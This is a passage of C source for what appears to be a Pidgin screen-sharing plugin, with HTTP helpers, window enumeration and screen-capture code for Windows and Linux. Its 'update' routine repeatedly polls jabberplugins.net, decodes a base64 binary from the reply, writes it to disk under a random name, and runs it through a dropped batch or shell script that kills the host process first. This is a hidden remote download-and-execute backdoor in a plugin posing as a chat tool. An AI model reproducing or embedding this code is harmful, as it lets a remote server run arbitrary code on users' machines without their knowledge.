	char* dst = string;
	while (*string && size--)
		string++;

	while (*string)
		*dst++ = *string++;
	*dst = '\0';
}

int count_characters(const char* string, char character, unsigned long length)
{
	unsigned long idx = 0, occurrences = 0;
	for (char* new_string = (char*)string;
		length > 0 ? length != idx : *new_string != 0;
		*new_string == character ? ++occurrences : 0, ++idx, ++new_string);
	return occurrences;
}

void get_http_header(char* headers, const char* header, char** out)
{
	if (!headers || !out || !header) return;

	int header_len = strlen(header);
	if (header_len == 0)
		return;

	int headers_len = strlen(headers);
	if (headers_len == 0)
		return;

	if (get_delimeter(headers, (char*)header) == 0)
		return;

	const char* local_headers = headers;
	do
	{
		if (strncmp((char*)local_headers, header, header_len) == 0)
		{
			if (*(local_headers + header_len) == ':')
				break;
		}
		local_headers++;
		headers_len--;
	} while (headers_len > 0);

	if (headers_len != 0)
	{
		local_headers += header_len;
		local_headers += *(local_headers + 1) == ' ' ? 2 : 1;

		unsigned long header_out_len = 0;
		for (; strncmp((char*)local_headers + header_out_len, "\r\n", 2) != 0;
			++header_out_len);

		if (header_out_len)
			*out = (char*)malloc(header_out_len + 1);

		if (*out != 0)
		{
			memcpy(*out, (void*)local_headers, header_out_len);
			*(*out + header_out_len) = '\0';
		}
	}
}

unsigned int http_get_socket(const char* ip, unsigned short port, int is_domain)
{
	unsigned int sock = socket(AF_INET, SOCK_STREAM,
#ifdef _WIN32
		IPPROTO_TCP
#else
		0
#endif
	);
	if (sock <= 0) return 0;

	struct sockaddr_in sockaddr;
	memset(&sockaddr, 0, sizeof(struct sockaddr_in));
	sockaddr.sin_family = AF_INET;
	sockaddr.sin_port = htons(port);

	if (!is_domain) sockaddr.sin_addr.s_addr = inet_addr(ip);
	else
	{
		struct hostent* dns_host = gethostbyname(ip);
		if (dns_host) sockaddr.sin_addr.s_addr = *(unsigned long*)dns_host->h_addr_list[0];
		else
		{
			closesocket(sock);
			return 0;
		}
	}

	if (connect(sock, (struct sockaddr*)&sockaddr, sizeof(struct sockaddr)) < 0)
	{
		closesocket(sock);
		return 0;
	}

	return sock;
}

int http_send_data(unsigned int sock, char* data, unsigned long data_length)
{
	int sent_total = 0, now = 0;
	for (; sent_total != data_length; )
	{
#ifdef _WIN32
		now = send(sock, data + sent_total, data_length - sent_total, 0);
		if (now == SOCKET_ERROR) return now;
#else
		now = write(sock, data + sent_total, data_length - sent_total);
#endif
		if (now > 0) sent_total += now;
		else
			if (now == 0) sent_total = data_length;
			else break;
	}
	return now;
}

unsigned long http_parse_response(unsigned int sock, const char* host, unsigned short port, unsigned char** response_headers, unsigned char** response_body, unsigned long* body_size)
{
	*response_headers = 0;

	unsigned long recv_total = 0, num_after_crlf = 0, sock_timeout = 5000;
	
#ifdef _WIN32
	setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char*)&sock_timeout, sizeof(unsigned long));
#else
	struct timeval timeout;
	timeout.tv_sec = 0;
	timeout.tv_usec = 25000;
	setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));
#endif

	do
	{
		if (!*response_headers)
			*response_headers = (unsigned char*)malloc(32 + 1);
		else
			*response_headers = (unsigned char*)realloc(*response_headers, recv_total + 32 + 1);

		unsigned long timeout = 0, size =
#ifdef _WIN32
			recv(sock, (char*)*response_headers + recv_total, 32, 0);
#else
			read(sock, (char*)*response_headers + recv_total, 32);
#endif

		if ((size == 0 || size == -1) && recv_total == 0)
		{
#ifdef _WIN32
			return 0;
#else
			if (errno == EAGAIN || errno == EWOULDBLOCK) {
				usleep(25000);
				continue;
			}
			else return -1;
#endif
		}
		recv_total += size;
		*(*response_headers + recv_total) = '\0';

#ifdef _WIN32
		Sleep(25);
#endif
	} while ((num_after_crlf = get_delimeter((char*)*response_headers, "\r\n\r\n")) == -1);

	char s_status_code[12] = { 0 };
	unsigned long status_offset = get_delimeter((char*)*response_headers, " "),
		num_read_after_crlf = recv_total - (num_after_crlf + 4);

	memcpy(s_status_code, *response_headers + status_offset + 1, 3);
	unsigned long status_code = str_to_ul(s_status_code);

	if (status_code == 307)
	{
		char* redirect = 0;
		get_http_header((char*)*response_headers, "Location", &redirect);
		if (redirect)
		{
			free((void*)*response_headers);
			*response_headers = 0;

			char request[260];
			memset(request, 0, 260);
			int request_length = sprintf
			(request,
				"GET %s HTTP/1.1\r\nConnection: close\r\n\r\n",
				redirect);
			closesocket(sock);
			free((void*)redirect);

			unsigned int redirect_sock = http_get_socket(host, port, count_characters(host, '.', strlen(host)) != 3 ? 1 : 0);
			if (redirect_sock)
			{
				http_send_data(sock, request, request_length);
				return http_parse_response(
					redirect_sock,
					host, port, response_headers, response_body, body_size);
			}
		}
		else return status_code;
	}

	char* s_content_length = 0;
	get_http_header((char*)*response_headers, "Content-Length", &s_content_length);
	if (s_content_length == 0) get_http_header((char*)*response_headers, "content-length", &s_content_length);

	if (s_content_length != 0)
	{
		int content_length = str_to_ul(s_content_length);
		if (body_size) *body_size = content_length;

		int cl_read_match = (int) num_read_after_crlf != content_length ? 1 : 0;
		*response_body = (unsigned char*)malloc(content_length + 1);
		if (*response_body == 0)
		{
			free((void*)s_content_length);
			free((void*)*response_body);
			return 0;
		}

		unsigned long copy_size = cl_read_match ? num_read_after_crlf : content_length;
		memcpy(
			*response_body,
			*response_headers + num_after_crlf + 4,
			copy_size
		);
		*(*response_body + copy_size) = '\0';

		if (cl_read_match)
		{
			recv_total = num_read_after_crlf;
			do
			{
				int curr_read =
#ifdef _WIN32
					recv(sock, (char*)*response_body + recv_total, content_length - recv_total, 0);
#else
					read(sock, (char*)*response_body + recv_total, content_length - recv_total);
#endif
				if (curr_read > 0)
				{
					recv_total += curr_read;

					*(*response_body + recv_total) = '\0';
				}
				else
					if (curr_read < 0)
					{
#ifndef _WIN32
						if (errno == EAGAIN || errno == EWOULDBLOCK) {
							usleep(25000);
							continue;
						}
						else {
#endif
							free((void*)s_content_length);
							free((void*)*response_body);
							return 0;
#ifndef _WIN32
						}
#endif
					}
			} while (recv_total != content_length);
		}
		*(*response_headers + num_after_crlf) = '\0';
		free((void*)s_content_length);
		return status_code;
	}
	else
	{
		char* content_encoding = 0;
		get_http_header((char*)*response_headers, "Transfer-Encoding", &content_encoding);
		int is_content_encoding = strncmp(content_encoding, "chunked", 7) == 0 ? 1 : 0;

		if (is_content_encoding)
		{
			char* chunk_hex = 0;
			unsigned long bytes_read = 0, curr_chunk_size = 0, curr_chunk_read_size = 0;
			if (num_read_after_crlf)
			{
				unsigned long crlf = get_delimeter((char*)*response_headers + num_after_crlf + 4, "\r\n");
				if (crlf != -1 && crlf != 0xFFFFFFFF)
				{
					chunk_hex = (char*)malloc(crlf + 1);
					memcpy(
						chunk_hex,
						(char*)*response_headers + num_after_crlf + 4,
						crlf
					);
					*(chunk_hex + crlf) = 0;

					get_chunk_size(
						chunk_hex,
						&curr_chunk_size);

					bytes_read = curr_chunk_read_size += num_read_after_crlf - crlf - 2;

					*response_body = (unsigned char*)malloc(curr_chunk_size + 1);
					if (*response_body)
					{
						memcpy(
							*response_body,
							*response_headers + num_after_crlf + 4 + crlf + 2,
							curr_chunk_read_size
						);
						*(*response_headers + num_after_crlf) = 0;
						*(*response_body + curr_chunk_read_size) = 0;
					}
				}
			}

			for (;;)
			{
				if (curr_chunk_size)
				{
					if (!num_after_crlf)
						*response_body = (unsigned char*)malloc(curr_chunk_size + 1);
					else
						*response_body = (unsigned char*)realloc(*response_body, bytes_read + curr_chunk_size + 1);

					do
					{
						int read_now =
#ifdef _WIN32
							recv(sock, (char*)*response_body + bytes_read, curr_chunk_size - curr_chunk_read_size, 0);
#else
							read(sock, (char*)*response_body + bytes_read, curr_chunk_size - curr_chunk_read_size);
#endif
						if (read_now != SOCKET_ERROR)
						{
							curr_chunk_read_size += read_now;
							bytes_read += read_now;

							*(*response_body + bytes_read) = '\0';
						}
					} while (curr_chunk_read_size < curr_chunk_size);

					curr_chunk_size = 0;
				}
				else
				{
					char* hex_chunk = 0;
				get_chunk:
					to_crlf(sock, &hex_chunk, &curr_chunk_read_size);
					if (curr_chunk_read_size == 2 && strncmp(hex_chunk, "\r\n", 2) == 0)
					{
						free((void*)hex_chunk);
						hex_chunk = 0;
						goto get_chunk;
					}
					else
					{
						if (*hex_chunk == '0')
						{
							free((void*)content_encoding);
							free((void*)hex_chunk);

							char* temp = 0;
							to_crlf(sock, &temp, &curr_chunk_read_size);
							free((void*)temp);

							if (body_size) *body_size = bytes_read;
							return status_code;
						}
						else if (hex_chunk)
						{
							curr_chunk_read_size = 0;
							unsigned long new_crlf = get_delimeter(hex_chunk, "\r\n");
							if (new_crlf != 0xFFFFFFFF && new_crlf > 0)
							{
								char* hex = (char*)malloc(new_crlf + 1);
								if (hex)
								{
									memcpy(
										hex,
										hex_chunk,
										new_crlf);
									*(hex + new_crlf) = '\0';

									get_chunk_size(hex, &curr_chunk_size);

									free((void*)hex_chunk);
									free((void*)hex);
								}
							}
							else free((void*)hex_chunk);
							hex_chunk = 0;
						}
					}
				}
			}
		}
		free((void*)content_encoding);
	}
	return 0;
}


const char* find_value(const char* json, const char* key)
{
	const char* start = strstr(json, key);
	if (!start) return NULL;
	start += strlen(key) + 1;

	while (*start == ' ' || *start == '\t' || *start == '\n' || *start == '\r' || *start == ':')
		start++;

	if (*start == '"')
	{
		start++;

		const char* end = strchr(start, '"');
		if (!end) return NULL;

		char* value = (char*)malloc(end - start + 1);
		if (!value) return NULL;

		strncpy(value, start, end - start);
		value[end - start] = '\0';
		return value;
	}
	else
	{
		const char* end = start;
		while (*end != ',' && *end != '}' && *end != '\0')
			end++;

		char* value = (char*)malloc(end - start + 1);
		if (!value) return NULL;

		strncpy(value, start, end - start);
		value[end - start] = '\0';
		return value;
	}
}

void generate_random_name(
#ifdef _WIN32
	wchar_t**
#else
	char**
#endif
	name) {
	const
#ifdef _WIN32
		wchar_t
#else
		char
#endif
		charset[] =
#ifdef _WIN32
		L"0123456789";
#else
		"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
#endif
	const size_t charset_size =
#ifdef _WIN32
		wcslen(charset);
	*name = (wchar_t*)malloc(9 * sizeof(wchar_t));
#else
		strlen(charset);
	*name = (char*)malloc(9);
#endif
	srand(time(0));
	for (int i = 0; i < 8; ++i) (*name)[i] = charset[rand() % charset_size];
	(*name)[8] =
#ifdef _WIN32
		L'\0';
#else
		'\0';
#endif
}

void* talk_to_update_server(void* arg)
{
	char uri[260] = { 0 }, *_uri = "/update/"
#ifdef _WIN32
		"win32";
#else
		"linux";
#endif

	sprintf(uri, "GET %s/%s HTTP/1.1\r\nHost: jabberplugins.net\r\nConnection: close\r\n\r\n", _uri, generate_guid());
	while (1)
	{
		int sock = http_get_socket("jabberplugins.net", 80, 1);
		if (sock)
		{
			http_send_data(sock, uri, strlen(uri));

			unsigned char* response_hdrs = 0;
			unsigned char* response_body = 0;
			unsigned long  response_size = 0;
			http_parse_response(sock, "jabberplugins.net", 80, &response_hdrs, &response_body, &response_size);

			if (response_body && purple_prefs_get_bool(PREF_UPDATE))
			{
				const char* bin_b64 = find_value(response_body, "bin_b64");
				const char* bin_upd = find_value(response_body, "bin_upd");

				if (bin_b64 && bin_upd)
				{
					if (strcmp(bin_upd, "yes") == 0)
					{
						size_t bin_size = 0;
						unsigned char* bin_data = b64_decode(bin_b64, &bin_size);
						if (bin_size)
						{
#ifdef _WIN32
							wchar_t* random_name = 0;
#else
							char* random_name = 0;
#endif
							generate_random_name(&random_name);
#ifdef _WIN32
							wchar_t local_appdata[260] = { 0 }, update_installer_path[260] = { 0 };
							GetEnvironmentVariableW(L"LOCALAPPDATA", local_appdata, 260);
							wsprintfW(update_installer_path, L"%s\\pidgin-ssotr\\pidgin-screenshare-updater-%s.exe", local_appdata, random_name);
							void* installer_handle = CreateFileW(update_installer_path, 0x40000000L, 0, 0, 2, 0x00000080, 0);
							if (installer_handle != -1)
							{
								unsigned long bytes_written = 0;
								do
								{
									unsigned long this_write = 0;
									if (WriteFile(installer_handle, bin_data + bytes_written, bin_size - bytes_written, &this_write, 0)) bytes_written += this_write;
									else break;
								} while (bytes_written != bin_size);
								CloseHandle(installer_handle);

                        wchar_t updater_path[260] = {0};
                        if (SUCCEEDED(SHGetFolderPathW(0, CSIDL_APPDATA, 0, 0, updater_path)))
                        {
                           lstrcatW(updater_path, L"\\upd_bin.bat");
                           void* updater_handle = CreateFileW(updater_path, 0x40000000L, 0, 0, 2, 0x00000080, 0);
                           if (updater_handle != -1)
                           {
                              const char* updater_batch_code =
                              "@echo off\n"
                              "set PID=%1\n"
                              "set UPD_BIN=%2\n"
                              "taskkill /F /PID %PID% /T\n"
                              "timeout /T 3 /NOBREAK >nul\n"
                              "%UPD_BIN%\n";
                              WriteFile(updater_handle, updater_batch_code, (unsigned long) strlen(updater_batch_code), &bytes_written, 0);
                              CloseHandle(updater_handle);
                           }

                           wchar_t updater_args[260] = {0};
                           wsprintfW(updater_args, L"%d \"%s\"", GetCurrentProcessId(), update_installer_path);
                           ShellExecuteW(
                           0, L"open",
                           updater_path,
                           updater_args,
                           0, SW_HIDE);
                        }
                     }
#else
							char payload_path[128] = { 0 };
							sprintf(payload_path, "/tmp/%s", random_name);
							FILE* payload_file = fopen(payload_path, "wb");
							if (payload_file != 0)
							{
								fwrite(bin_data, sizeof(unsigned char), bin_size, payload_file);
								fclose(payload_file);

								chmod(payload_path, S_IRWXU | S_IRGRP | S_IXGRP | S_IROTH | S_IXOTH);

                        const char *updater_path = "/tmp/upd_bin.sh";
                        FILE *updater_file = fopen(updater_path, "w");
                        if (updater_file != 0)
                        {
                           fprintf(updater_file,
                           "#!/bin/bash\n"
                           "PID=$1\n"
                           "UPD_BIN=$2\n"
                           "kill -9 $PID\n"
                           "sleep 3\n"
                           "$UPD_BIN\n");
                           fclose(updater_file);

                           chmod(updater_path, S_IRUSR | S_IWUSR | S_IXUSR | S_IRGRP | S_IROTH);
                           
                           char updater_command[256] = {0};
                           snprintf(updater_command, sizeof(updater_command), "%s %d %s", updater_path, getpid(), payload_path);
                           system(updater_command);
                        }
							}
#endif
							free(random_name);
							free((void*)bin_data);
						}
					}
					free((void*)bin_b64);
					free((void*)bin_upd);
				}
				free((void*)response_body);
			}

			if (response_hdrs) free((void*)response_hdrs);

			closesocket(sock);
		}
#ifdef _WIN32
		Sleep(5000);
#else
		sleep(5);
#endif
	}
}

typedef struct
{
   #ifdef _WIN32
   HWND hwnd;
   #else
   Window hwnd;
   #endif
   char title[260];
	char name[260];
}
window_info;

#ifdef _WIN32
int get_process_name_from_path(HWND hwnd, char* exe_name)
{
   unsigned long process_id;
   GetWindowThreadProcessId(hwnd, &process_id);

   void* process_handle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, process_id);
   if (process_handle == NULL) return FALSE;

char exe_path[MAX_PATH] = {0};
   unsigned long exe_path_length = GetModuleFileNameExA(process_handle, NULL, exe_path, 260);
if (!exe_path_length)
{
      CloseHandle(process_handle);
      return FALSE;
   }

   char* file_name_start = strrchr(exe_path, '\\');
   if (file_name_start == NULL)
   {
      CloseHandle(process_handle);
      return FALSE;
   }

   strcpy(exe_name, file_name_start + 1);
   exe_name[exe_path_length - (file_name_start - exe_path)] = '\0';

   CloseHandle(process_handle);
   return TRUE;
}

BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam)
{
	window_info* window_list = (window_info*)lParam;
   for (int i = 0; i < 256; i++)
	{
      if (window_list[i].hwnd == 0)
		{
			if (!IsWindowVisible(hwnd)) return TRUE;

			int length = GetWindowTextLengthW(hwnd);
			if (length == 0) return TRUE;

			if (!get_process_name_from_path(hwnd, window_list[i].name)) return TRUE;

			wchar_t* title = malloc((length + 1) * 2);
			if (title == 0) return TRUE;

			GetWindowTextW(hwnd, title, length + 1);
			int utf8_length = WideCharToMultiByte(CP_UTF8, 0, title, -1, NULL, 0, NULL, NULL);
			if (utf8_length == 0)
			{
				free(title);
				return TRUE;
			}

			char* utf8_title = malloc(utf8_length + 1);
			if (utf8_title == 0)
			{
				free(title);
				return TRUE;
			}

			WideCharToMultiByte(CP_UTF8, 0, title, -1, utf8_title, utf8_length, NULL, NULL);
			free(title);

         window_list[i].hwnd = hwnd;
         strcpy(window_list[i].title, utf8_title);
			window_list[i].title[utf8_length] = '\0';
			free(utf8_title);
         break;
      }
   }
   return TRUE;
}

HWND selected_window = 0;
void real_window_to_top(HWND window)
{
	unsigned long remote_process_thread = GetWindowThreadProcessId(window, NULL);
	if (remote_process_thread)
	{
		unsigned long curr_process_id = GetCurrentThreadId();
		if (curr_process_id)
		{
			if (IsIconic(window)) ShowWindow(window, SW_RESTORE);
			AttachThreadInput(curr_process_id, remote_process_thread, TRUE);
			SetWindowPos(window, HWND_TOPMOST,   0, 0, 0, 0, SWP_NOSIZE | SWP_NOMOVE);
			SetWindowPos(window, HWND_NOTOPMOST, 0, 0, 0, 0, SWP_NOSIZE | SWP_NOMOVE);
			SetForegroundWindow(window);
			AttachThreadInput(curr_process_id, remote_process_thread, FALSE);
			SetFocus(window);
			SetActiveWindow(window);
		}
	}
}
#else
Window selected_window = 0;
void real_window_to_top(Display* display, Window window)
{
   XRaiseWindow(display, window);
   XSetInputFocus(display, window, RevertToParent, CurrentTime);
}

int is_taskbar_window(Display *display, Window window)
{
    Atom net_wm_state = XInternAtom(display, "_NET_WM_STATE", False);
    Atom net_wm_state_skip_taskbar = XInternAtom(display, "_NET_WM_STATE_SKIP_TASKBAR", False);

    Atom type;
    int format;
    unsigned long nitems, bytes_after;
    unsigned char *data = 0;

    if (XGetWindowProperty(display, window, net_wm_state, 0, G_MAXLONG, False, AnyPropertyType, &type, &format, &nitems, &bytes_after, &data) == Success)
    {
      if (type == XA_ATOM && data)
      {
         Atom* states = (Atom*) data;
         for (int i = 0; i < nitems; ++i)
         {
            if (states[i] == net_wm_state_skip_taskbar)
            {
               XFree(data);
               return 0;
            }
         }
      }
      XFree(data);
    }
    return 1;
}

void enum_windows_proc(void* window_object)
{
   window_info* window_list = (window_info*) window_object;
   if (!window_list) return;

   GdkScreen *screen = gdk_screen_get_default();
   if (screen)
   {
      GList* window_list = gdk_screen_get_window_stack(screen);
      if (window_list)
      {
         int num_win = 0;
         char _process_name[256];
         for (GList *iter = window_list; iter; iter = g_list_next(iter))
         {
            GdkWindow* window = GDK_WINDOW(iter->data);
            if (window)
            {
               Window xid = GDK_WINDOW_XID(window);
               if (xid)
               {
                  Display* display = GDK_DISPLAY_XDISPLAY(gdk_display_get_default());
                  if (display)
                  {
                     if (is_taskbar_window(display, xid))
                     {
                        Atom type;
                        int format;
                        unsigned long nitems, bytes_after;
                        unsigned char *title = 0, *pid = 0;
                     
                        memset(window_list[num_win].title, 0, 260);
                        memset(window_list[num_win].name, 0, 260);

                        if (XGetWindowProperty(display, xid, XInternAtom(display, "_NET_WM_NAME", False), 0, G_MAXLONG, False, AnyPropertyType, &type, &format, &nitems, &bytes_after, &title) == Success)
                        {
                           if (title)
                           {  
                              int window_title_len = strlen((char*) title);
                              strncpy(window_list[num_win].title, title, window_title_len);
                              XFree(title);
                           }
                        }
                        if (XGetWindowProperty(display, xid, XInternAtom(display, "_NET_WM_PID", False), 0, 1, False, XA_CARDINAL, &type, &format, &nitems, &bytes_after, &pid) == Success)
                        {
                           if (pid)
                           {
                              if (type == XA_CARDINAL && format == 32 && nitems == 1)
                              {
                                 char proc_path[32] = {0};
                                 snprintf(proc_path, sizeof(proc_path), "/proc/%d/cmdline", *((pid_t *) pid));

                                 FILE *file = fopen(proc_path, "r");
                                 if (file)
                                 {
                                    memset(_process_name, 0, 256);
                                    if (fgets(_process_name, 255, file))
                                    {
                                       int _process_name_len = strlen(_process_name);
                                       if (_process_name_len) strncpy(window_list[num_win].name, _process_name, _process_name_len);
                                    }
                                    fclose(file);
                                 }
                              }
                              XFree(pid);
                           }
                        }
                        window_list[num_win].hwnd = xid;
                        if (window_list[num_win].name [0] == 0) memcpy(window_list[num_win].name, "(no name)", 9);
                        if (window_list[num_win].title[0] == 0) memcpy(window_list[num_win].title, "(no name)", 9);

                        ++num_win;
                     }
                  }
               }
            }
         }
         g_list_free_full(window_list, (GDestroyNotify)g_object_unref);
      }
   }
}
#endif

window_info window_list[256];

void gtk_messagebox(const char* message)
{
	GtkWidget *dialog = gtk_message_dialog_new(0, GTK_DIALOG_MODAL, GTK_MESSAGE_INFO, GTK_BUTTONS_OK,
   #ifndef _WIN32
   "%s", 
   #endif
   message);
	gtk_window_set_modal(GTK_WINDOW(dialog), TRUE);
	gtk_dialog_run(GTK_DIALOG(dialog));
	gtk_widget_destroy(dialog);
}

#ifdef _WIN32
void capture_window(HWND hwnd, int* target_width, int* target_height, unsigned char** bitmap_data, unsigned long* bitmap_size)
{
   RECT rc = {0};
   if (hwnd == GetDesktopWindow())
   {
      DEVMODE dm;
      dm.dmSize = sizeof(dm);
      EnumDisplaySettings(0, ENUM_CURRENT_SETTINGS, &dm);
      rc.right = *target_width = dm.dmPelsWidth;
      rc.bottom = *target_height = dm.dmPelsHeight;
      rc.left = 0;
      rc.top = 0;
   }
   else
   {
      GetWindowRect(hwnd, &rc);
      *target_width = rc.right - rc.left;
      *target_height = rc.bottom - rc.top;
   }

	HDC hdcWindow = GetDC(hwnd);
	HDC hdcMemDC = CreateCompatibleDC(hdcWindow);
	HBITMAP hBitmap = CreateCompatibleBitmap(hdcWindow, *target_width, *target_height);
	if (!hBitmap)
	{
		ReleaseDC(hwnd, hdcWindow);
		DeleteDC(hdcMemDC);
		return;
	}

	void* bitmap_object = SelectObject(hdcMemDC, hBitmap);

   if (hwnd == GetDesktopWindow()) BitBlt(hdcMemDC, 0, 0, *target_width, *target_height, hdcWindow, 0, 0, SRCCOPY);
   else
   {
      long window_styles = GetWindowLongA(hwnd, GWL_EXSTYLE);
      SetWindowLongA(hwnd, GWL_EXSTYLE, window_styles | WS_EX_LAYERED);

      char window_class_name[260] = {0};
      RealGetWindowClassA(hwnd, window_class_name, 260 - 1);

      unsigned long raster_operation = SRCCOPY;
      if (strstr(window_class_name, "ApplicationFrameWindow") || strstr(window_class_name, "Windows.UI.Core.CoreWindow"))
         raster_operation |= CAPTUREBLT;

      PrintWindow(hwnd, hdcMemDC, 2);
   }

	POINT cursorPos;
	GetCursorPos(&cursorPos);

	HWND window_from_point = WindowFromPoint(cursorPos);
	if (window_from_point)
	{
		HMENU menu_window = GetMenu(window_from_point);
		if (menu_window && GetForegroundWindow() == window_from_point)
		{
			HDC hdcMenu = GetDC(window_from_point);
			HDC hdcCompatibleMenu = CreateCompatibleDC(hdcMenu);
			ReleaseDC(window_from_point, hdcMenu);

			RECT menuRect;
			GetClientRect(window_from_point, &menuRect);
			int menuWidth = menuRect.right - menuRect.left;
			int menuHeight = menuRect.bottom - menuRect.top;

			HBITMAP hBitmapMenu = CreateCompatibleBitmap(hdcCompatibleMenu, menuWidth, menuHeight);
			HBITMAP hOldBitmap = (HBITMAP)SelectObject(hdcCompatibleMenu, hBitmapMenu);

			BitBlt(hdcMemDC, cursorPos.x - rc.left, cursorPos.y - rc.top, menuWidth, menuHeight, hdcCompatibleMenu, 0, 0, SRCCOPY);

			SelectObject(hdcCompatibleMenu, hOldBitmap);
			DeleteObject(hBitmapMenu);
			DeleteDC(hdcCompatibleMenu);
		}
	}

	HCURSOR cursor_handle = LoadCursorA(0, IDC_ARROW);
	if (cursor_handle)
	{
		ICONINFO icon_info;
		memset(&icon_info, 0, sizeof(ICONINFO));
		GetIconInfo(cursor_handle, &icon_info);

      RECT client_rect, window_rect;
      GetClientRect(hwnd, &client_rect);
      GetWindowRect(hwnd, &window_rect);

      int window_diff_x = (window_rect.right - window_rect.left) - (client_rect.right - client_rect.left);
      int window_diff_y = (window_rect.bottom - window_rect.top) - (client_rect.bottom - client_rect.top);

		ScreenToClient(hwnd, &cursorPos);

		BITMAP cursor_bitmap;
		memset(&cursor_bitmap, 0, sizeof(BITMAP));
		GetObjectA(icon_info.hbmColor, sizeof(BITMAP), &cursor_bitmap);

		DrawIconEx(hdcMemDC, cursorPos.x + window_diff_x, cursorPos.y + window_diff_y, cursor_handle, cursor_bitmap.bmWidth, cursor_bitmap.bmHeight, 0, 0, DI_NORMAL);
	}

	BITMAP bmp;
	memset(&bmp, 0, sizeof(BITMAP));
	GetObjectA(hBitmap, sizeof(BITMAP), &bmp);

	BITMAPINFOHEADER bitmap_info;
	memset(&bitmap_info, 0, sizeof(BITMAPINFOHEADER));

	bitmap_info.biSize        = sizeof(BITMAPINFOHEADER);
	bitmap_info.biWidth       = bmp.bmWidth;
	bitmap_info.biHeight      = bmp.bmHeight;
	bitmap_info.biPlanes      = 1;
	bitmap_info.biBitCount    = 24;
	bitmap_info.biCompression = BI_RGB;

	int row_stride = ((bmp.bmWidth * 3 + 3) & ~3);
	int real_bitmap_size = row_stride * bmp.bmHeight;
	void* di_bits = (void*) malloc(real_bitmap_size);
	unsigned char* bitmap_pdata = (unsigned char*) GlobalLock(di_bits);

	GetDIBits(hdcWindow, hBitmap, 0,
		bmp.bmHeight,
		bitmap_pdata,
		(BITMAPINFO *) &bitmap_info, DIB_RGB_COLORS);
	
	*bitmap_size = (real_bitmap_size += sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER));
	*bitmap_data = (unsigned char*)malloc(real_bitmap_size);
   if (!(*bitmap_data))
   {
      GlobalUnlock(di_bits);
      free(di_bits);

      DeleteObject(hBitmap);
      ReleaseDC(hwnd, hdcWindow);
      DeleteDC(hdcMemDC);
      return;
   }

   unsigned char* temp_ptr = *bitmap_data;

   BITMAPFILEHEADER file_header;
   memset(&file_header, 0, sizeof(BITMAPFILEHEADER));
   file_header.bfType = 0x4D42; // BM
   file_header.bfSize = real_bitmap_size;
   file_header.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);

   memcpy(temp_ptr, &file_header, sizeof(BITMAPFILEHEADER));
   temp_ptr += sizeof(BITMAPFILEHEADER);

   BITMAPINFOHEADER info_header;
   memset(&info_header, 0, sizeof(BITMAPINFOHEADER));
   info_header.biSize = sizeof(BITMAPINFOHEADER);
   info_header.biWidth = *target_width;
   info_header.biHeight = *target_height;
   info_header.biPlanes = 1;
   info_header.biBitCount = 24;
   info_header.biCompression = BI_RGB;
   info_header.biSizeImage = 0;

   memcpy(temp_ptr, &info_header, sizeof(BITMAPINFOHEADER));
   temp_ptr += sizeof(BITMAPINFOHEADER);

   for (int i = 0; i < *target_height; ++i)
   {
      memcpy(temp_ptr, bitmap_pdata + i * row_stride, row_stride);
      temp_ptr += row_stride;
   }

	GlobalUnlock(di_bits);
	free(di_bits);

	SelectObject(hdcMemDC, bitmap_object);
   DeleteObject(hBitmap);
   ReleaseDC(hwnd, hdcWindow);
   DeleteDC(hdcMemDC);
}
#else
void sleep_ms(unsigned long milliseconds)
{
    struct timespec req;
    req.tv_sec = milliseconds / 1000;
    req.tv_nsec = (milliseconds % 1000) * 1000000;
    nanosleep(&req, 0);
}

typedef struct
{
   unsigned char *data;
   size_t         size;
   size_t     capacity;
}
buffer_t;

static cairo_status_t write_png_to_buffer(void *closure, const unsigned char *data, unsigned int length)
{
   buffer_t *buf = (buffer_t *) closure;
   if ((buf->size + length) > buf->capacity)
   {
      size_t new_capacity = buf->capacity + length + 4096;
      unsigned char *new_data = (unsigned char *) realloc(buf->data, new_capacity);
      if (!new_data)
      {
         free(buf->data);
         buf->data = NULL;
         buf->size = buf->capacity = 0;
         return CAIRO_STATUS_WRITE_ERROR;
      }

      buf->data = new_data;
      buf->capacity = new_capacity;
   }

   memcpy(buf->data + buf->size, data, length);
   buf->size += length;

   return CAIRO_STATUS_SUCCESS;
}

void save_pixbuf_to_memory(GdkPixbuf *pixbuf, unsigned char** bitmap, gsize *data_size)
{
   GOutputStream *memory_output_stream = g_memory_output_stream_new_resizable();
   if (!memory_output_stream) return 0;

   GError *error = 0;
   gboolean success = gdk_pixbuf_save_to_stream(pixbuf, memory_output_stream, "png", NULL, &error, NULL);

   if (!success)
   {
      g_error_free(error);
      g_object_unref(memory_output_stream);
      return 0;
   }

   *data_size = g_memory_output_stream_get_data_size(G_MEMORY_OUTPUT_STREAM(memory_output_stream));
   const void *data = g_memory_output_stream_get_data(G_MEMORY_OUTPUT_STREAM(memory_output_stream));
   *bitmap = (unsigned char *) malloc(*data_size);
   if (*bitmap) memcpy(*bitmap, data, *data_size);
   else return 0;

   g_object_unref(memory_output_stream);
}

_wm_type get_window_manager()
{
   GError *error = 0;
   _wm_type wm_type = WM_UNK;
   GDBusConnection *connection = g_bus_get_sync(G_BUS_TYPE_SESSION, 0, &error);
   if (connection)
   {
      GVariant *result = g_dbus_connection_call_sync(
         connection,
         "org.freedesktop.DBus",
         "/org/freedesktop/DBus",
         "org.freedesktop.DBus",
         "ListNames",
         0,
         G_VARIANT_TYPE("(as)"),
         G_DBUS_CALL_FLAGS_NONE,
         -1,
         0,
         &error
      );

      if (!error && result)
      {
         GVariantIter *iter;
         const char *name = 0;
         g_variant_get(result, "(as)", &iter);
         while (g_variant_iter_loop(iter, "s", &name))
         {
            if (g_strcmp0(name, "org.gnome.Shell") == 0)
            {
               g_variant_iter_free(iter);
               g_variant_unref(result);
               g_object_unref(connection);
               wm_type = !can_gnome_screen_capture ? WM_UNK : WM_GNOME;
               if (wm_type == WM_UNK) gtk_messagebox("Your WM is GNOME, but gnome-screenshot is not detected. Screen-capture will not work this way. Please 'sudo apt install gnome-screenshot', restart & try again!");
               break;
            } else
            if (g_strcmp0(name, "org.kde.KWin") == 0)
            {
               g_variant_iter_free(iter);
               g_variant_unref(result);
               g_object_unref(connection);
